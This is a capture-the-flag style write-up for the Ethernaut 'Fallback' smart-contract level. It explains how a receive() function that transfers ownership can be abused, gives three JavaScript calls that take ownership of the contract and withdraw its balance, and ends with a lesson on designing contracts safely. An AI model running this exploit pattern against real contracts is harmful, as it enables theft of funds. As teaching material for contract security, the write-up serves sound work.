# 1. Fallback

## Goal
Claim ownership of the contract and reduce its balance to zero.

## Vulnerability
The `receive` function sets the caller as owner if they send ETH and have a non-zero contribution. Combined with the `contribute` function, this lets you become owner without out-contributing the original owner.

## Exploit
\`\`\`javascript
// make a tiny contribution to pass the receive() check
await contract.contribute({ value: toWei('0.0001') })

// trigger receive() by sending ETH directly, claiming ownership
await contract.sendTransaction({ value: toWei('0.0001') })

// drain the contract now that you're owner
await contract.withdraw()
\`\`\`

## Takeaway
Be careful what `receive`/`fallback` functions do. Putting ownership changes in a function triggered by a plain ETH transfer is an easy way to lose control of a contract.